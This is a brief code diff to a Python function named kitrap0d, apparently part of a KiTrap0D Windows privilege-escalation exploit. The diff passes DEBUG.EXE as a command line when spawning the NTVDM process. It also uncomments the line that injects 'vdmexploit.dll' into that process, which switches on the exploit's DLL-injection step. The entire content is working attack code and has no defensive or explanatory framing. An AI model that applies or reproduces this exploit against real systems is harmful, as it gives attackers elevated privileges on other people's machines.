@@ -73,7 +73,7 @@ def kitrap0d():
     startupinfo.cb = ctypes.sizeof(startupinfo)
     kernel32.CreateProcessA(
                             "C:\\WINDOWS\\SYSTEM32\\DEBUG.EXE",
-                            None,
+                            "C:\\WINDOWS\\SYSTEM32\\DEBUG.EXE",
                             None,
                             None,
                             False,
@@ -91,4 +91,4 @@ def kitrap0d():
     kernel32.CloseHandle(process_information.hThread)
     kernel32.CloseHandle(process_information.hProcess)
     ntvdminject = dllinject.Process(handle=ntvdm)
-    #print ntvdminject.inject("vdmexploit.dll")
+    print ntvdminject.inject("vdmexploit.dll")
